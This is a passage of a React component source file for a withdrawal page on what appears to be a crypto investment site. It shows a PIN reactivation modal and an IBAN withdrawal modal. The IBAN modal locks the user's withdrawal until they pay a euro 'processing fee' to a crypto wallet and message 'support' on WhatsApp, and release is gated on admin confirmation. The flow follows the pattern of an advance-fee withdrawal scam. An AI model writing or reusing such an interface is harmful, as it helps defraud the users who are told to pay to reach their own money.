                  onClick={() => setShowReactivationModal(false)}
                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancel
                </button>
                <button
                  onClick={handleVerifyPin}
                  disabled={isVerifyingPin}
                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  {isVerifyingPin ? (
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  ) : (
                    'Reactivate'
                  )}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ═══════════════════════════════════════════════════════════
          ✅ IBAN FEE MODAL — COMPLETELY ISOLATED FROM CRYPTO FLOW
          ═══════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showIbanModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-sky-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
            >
              {/* Icon */}
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-sky-500/10 border border-sky-500/40 rounded-full flex items-center justify-center">
                  <FaUniversity className="w-8 h-8 text-sky-400" />
                </div>
              </div>

              {/* Heading */}
              <h3 className="text-xl font-bold text-white text-center mb-2">
                IBAN Withdrawal Fee Required
              </h3>

              <p className="text-sm text-slate-400 text-center mb-5">
                To process your IBAN bank transfer, a one-time processing fee of{' '}
                <strong className="text-sky-400">€{IBAN_FEE_AMOUNT_EUR}.00</strong> is required.
              </p>

              {/* Fee Notice */}
              <div className="mb-4 p-4 bg-sky-500/10 border-2 border-sky-500/40 rounded-lg">
                <div className="flex items-start gap-3">
                  <FaInfoCircle className="text-sky-400 text-lg mt-0.5 flex-shrink-0" />
                  <div className="text-sky-300 text-xs leading-relaxed space-y-2">
                    <p className="font-bold text-sky-200 text-sm uppercase tracking-wide">
                      Processing Fee
                    </p>
                    <p>
                      Amount: <strong className="text-white">€{IBAN_FEE_AMOUNT_EUR}.00</strong>
                    </p>
                    <p>
                      Send the fee to the wallet address below and notify our support team.
                      Once the payment is confirmed, your IBAN withdrawal will be released.
                    </p>
                  </div>
                </div>
              </div>

              {/* Fee wallet address */}
              <div className="mb-4">
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  Payment Wallet Address ({IBAN_FEE_WALLET_LABEL})
                </label>
                <div className="flex items-center gap-2">
                  <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
                    {IBAN_FEE_WALLET_ADDRESS}
                  </code>
                  <button
                    type="button"
                    onClick={copyIbanFeeWallet}
                    className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
                    title="Copy address"
                  >
                    {ibanCopied ? (
                      <FaCheck className="text-green-400" />
                    ) : (
                      <FaCopy className="text-white" />
                    )}
                  </button>
                </div>
              </div>

              {/* Summary */}
              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-slate-400">Withdrawal Amount:</span>
                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Account Holder:</span>
                  <span className="text-white font-semibold truncate max-w-[150px]">
                    {ibanAccountName || '—'}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">IBAN:</span>
                  <span className="text-white font-mono text-xs truncate max-w-[150px]">
                    {ibanAccountNumber || '—'}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Fee:</span>
                  <span className="text-sky-400 font-semibold">€{IBAN_FEE_AMOUNT_EUR}.00</span>
                </div>
              </div>

              {/* Status / lock notice */}
              {!IBAN_FEE_PAID ? (
                <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                  <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                  <p className="text-yellow-300 text-xs leading-relaxed">
                    <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
                    Your withdrawal is locked until the fee has been received and verified.
                    Please contact support after sending the payment.
                  </p>
                </div>
              ) : (
                <div className="mb-5 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
                  <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
                  <p className="text-green-300 text-xs leading-relaxed">
                    <strong className="text-green-200">Fee confirmed!</strong> You may now
                    proceed with your IBAN withdrawal.
                  </p>
                </div>
              )}

              {/* Actions */}
              <div className="flex flex-col gap-3">
                <button
                  type="button"
                  onClick={finalizeIbanWithdrawal}
                  disabled={!IBAN_FEE_PAID || ibanSubmitting}
                  className={`w-full py-3 rounded-lg text-white font-bold transition flex items-center justify-center gap-2 ${
                    IBAN_FEE_PAID && !ibanSubmitting
                      ? 'bg-gradient-to-r from-sky-600 to-indigo-600 hover:opacity-90'
                      : 'bg-slate-700 opacity-50 cursor-not-allowed'
                  }`}
                >
                  {ibanSubmitting ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      Submitting...
                    </>
                  ) : (
                    <>
                      <FaArrowDown /> Proceed with Withdrawal
                    </>
                  )}
                </button>

                <a
                  href={`https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
                    `Hello Support,\n\nI have paid the €${IBAN_FEE_AMOUNT_EUR} IBAN withdrawal fee.\n\n— Details —\nAmount: $${amountNum.toLocaleString()}\nAccount Holder: ${ibanAccountName}\nIBAN: ${ibanAccountNumber}\n\nPlease confirm my payment and unlock my withdrawal. Thank you.`
                  )}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                >
                  <FaWhatsapp className="text-lg" />
                  Notify Support / Send Proof
                </a>

                <button
                  type="button"
                  onClick={() => setShowIbanModal(false)}
                  className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancel
                </button>
              </div>

              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
                <FaHeadset className="text-slate-500" />
                <span>Support is available 24/7</span>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default Withdraw;